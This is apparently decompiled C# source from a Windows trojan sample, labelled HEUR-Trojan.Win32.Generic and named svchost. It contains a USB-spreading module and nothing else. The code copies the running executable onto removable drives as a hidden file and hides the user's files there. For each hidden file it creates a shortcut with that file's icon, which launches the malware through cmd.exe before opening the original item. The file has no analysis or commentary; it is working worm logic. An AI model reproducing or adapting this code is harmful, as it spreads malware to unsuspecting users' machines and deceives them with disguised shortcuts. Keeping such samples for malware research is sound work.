// Decompiled with JetBrains decompiler
// Type: svchost.Spreads.USBSpread
// Assembly: svchost, Version=10.0.18362.1, Culture=neutral, PublicKeyToken=null
// MVID: 64EF29CB-BBE3-43C5-8FBF-9660E67757C5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-b33d569af5e490875d6473c6402797ddb4ce639bb1f1cf7f67698eeafa625f09.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace svchost.Spreads
{
  [OptionText]
  public class USBSpread
  {
    private bool Off;
    private Thread thread;
    public string ExeName;
    public Collection dr;

    public USBSpread()
    {
      this.Off = false;
      this.thread = (Thread) null;
      this.dr = new Collection();
    }

    public void Start()
    {
      if (this.thread != null)
        return;
      this.thread = new Thread(new ThreadStart(this.usb));
      this.thread.IsBackground = true;
      this.thread.Start();
    }

    public void clean()
    {
      this.Off = true;
      while (this.thread != null)
        Thread.Sleep(1);
      DriveInfo[] drives = DriveInfo.GetDrives();
      int index1 = 0;
      while (index1 < drives.Length)
      {
        DriveInfo driveInfo = drives[index1];
        try
        {
          if (driveInfo.IsReady)
          {
            if (driveInfo.DriveType == DriveType.Removable | driveInfo.DriveType == DriveType.CDRom)
            {
              if (File.Exists(driveInfo.Name + this.ExeName))
              {
                File.SetAttributes(driveInfo.Name + this.ExeName, FileAttributes.Normal);
                File.Delete(driveInfo.Name + this.ExeName);
              }
              string[] files = Directory.GetFiles(driveInfo.Name);
              int index2 = 0;
              while (index2 < files.Length)
              {
                string path = files[index2];
                try
                {
                  File.SetAttributes(path, FileAttributes.Normal);
                  if (path.ToLower().EndsWith(".lnk"))
                    File.Delete(path);
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                }
                checked { ++index2; }
              }
              string[] directories = Directory.GetDirectories(driveInfo.Name);
              int index3 = 0;
              while (index3 < directories.Length)
              {
                string path = directories[index3];
                try
                {
                  new DirectoryInfo(path).Attributes = FileAttributes.Normal;
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                }
                checked { ++index3; }
              }
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++index1; }
      }
    }

    public void usb()
    {
      this.thread = (Thread) null;
      this.clean();
      this.thread = Thread.CurrentThread;
      this.Off = false;
      while (!this.Off)
      {
        try
        {
          DriveInfo[] drives = DriveInfo.GetDrives();
          int index1 = 0;
          while (index1 < drives.Length)
          {
            DriveInfo x = drives[index1];
            USBSpread.DRV drv;
            if (!this.dr.Contains(x.Name.ToLower()))
            {
              drv = new USBSpread.DRV();
              drv.drive = x.Name;
              this.dr.Add((object) drv, x.Name.ToLower());
            }
            else
              drv = (USBSpread.DRV) this.dr[x.Name.ToLower()];
            if (!this.Off)
            {
              try
              {
                if (x.IsReady)
                {
                  if (x.TotalFreeSpace > 0L & x.DriveType == DriveType.Removable | x.DriveType == DriveType.CDRom)
                  {
                    try
                    {
                      if (!File.Exists(x.Name + this.ExeName))
                      {
                        File.Copy(Application.ExecutablePath, x.Name + this.ExeName, true);
                        File.SetAttributes(x.Name + this.ExeName, FileAttributes.Hidden);
                      }
                      string[] files = Directory.GetFiles(x.Name);
                      int index2 = 0;
                      while (index2 < files.Length)
                      {
                        string str = files[index2];
                        if (Operators.CompareString(Path.GetExtension(str).ToLower(), ".lnk", true) != 0 & Operators.CompareString(str.ToLower(), x.Name.ToLower() + this.ExeName.ToLower(), true) != 0)
                        {
                          if (!drv.Files.Contains(new FileInfo(str).Name))
                          {
                            if (drv.Files.Count < 20)
                            {
                              this.lnk(x, str, this.GetIcon(Path.GetExtension(str)));
                              drv.Files.Add(new FileInfo(str).Name);
                              File.SetAttributes(str, FileAttributes.Hidden);
                              drv.lnk.Add(File.ReadAllText(x.Name + new FileInfo(str).Name + ".lnk"));
                            }
                          }
                          else if (drv.Files.Contains(new FileInfo(str).Name))
                          {
                            if (File.GetAttributes(str) != FileAttributes.Hidden)
                              File.SetAttributes(str, FileAttributes.Hidden);
                            if (!File.Exists(x.Name + new FileInfo(str).Name + ".lnk"))
                              this.lnk(x, str, this.GetIcon(Path.GetExtension(str)));
                            else if (Operators.CompareString(File.ReadAllText(x.Name + new FileInfo(str).Name + ".lnk"), drv.lnk[drv.Files.IndexOf(new FileInfo(str).Name)], true) != 0)
                              this.lnk(x, str, this.GetIcon(Path.GetExtension(str)));
                          }
                        }
                        checked { ++index2; }
                      }
                    }
                    catch (Exception ex)
                    {
                      ProjectData.SetProjectError(ex);
                      ProjectData.ClearProjectError();
                    }
                  }
                }
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
              checked { ++index1; }
            }
            else
              goto label_31;
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        Thread.Sleep(3000);
      }
label_31:
      this.thread = (Thread) null;
    }

    public object lnk(DriveInfo x, string xx, string ico)
    {
      try
      {
        File.Delete(x.Name + new FileInfo(xx).Name + ".lnk");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      object Instance = NewLateBinding.LateGet(Interaction.CreateObject("WScript.Shell"), (System.Type) null, "CreateShortcut", new object[1]
      {
        (object) (x.Name + new FileInfo(xx).Name + ".lnk")
      }, (string[]) null, (System.Type[]) null, (bool[]) null);
      NewLateBinding.LateSetComplex(Instance, (System.Type) null, "TargetPath", new object[1]
      {
        (object) "cmd.exe"
      }, (string[]) null, (System.Type[]) null, false, true);
      NewLateBinding.LateSetComplex(Instance, (System.Type) null, "WorkingDirectory", new object[1]
      {
        (object) ""
      }, (string[]) null, (System.Type[]) null, false, true);
      NewLateBinding.LateSetComplex(Instance, (System.Type) null, "Arguments", new object[1]
      {
        (object) ("/c start " + this.ExeName.Replace(" ", "\" \"") + "&explorer /root,\"%CD%" + new DirectoryInfo(xx).Name + "\" & exit")
      }, (string[]) null, (System.Type[]) null, false, true);
      NewLateBinding.LateSetComplex(Instance, (System.Type) null, "IconLocation", new object[1]
      {
        (object) ico
      }, (string[]) null, (System.Type[]) null, false, true);
      NewLateBinding.LateCall(Instance, (System.Type) null, "Save", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
      return (object) true;
    }

    public string GetIcon(string ext)
    {
      string icon;
      try
      {
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Classes\\", false);
        string str = Conversions.ToString(registryKey.OpenSubKey(Conversions.ToString(Operators.ConcatenateObject(registryKey.OpenSubKey(ext, false).GetValue(""), (object) "\\DefaultIcon\\"))).GetValue("", (object) ""));
        if (!str.Contains(","))
          str += ",0";
        icon = str;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        icon = "";
        ProjectData.ClearProjectError();
      }
      return icon;
    }

    [OptionText]
    public class DRV
    {
      public string drive;
      public List<string> Files;
      public List<string> lnk;

      public DRV()
      {
        this.Files = new List<string>();
        this.lnk = new List<string>();
      }
    }
  }
}
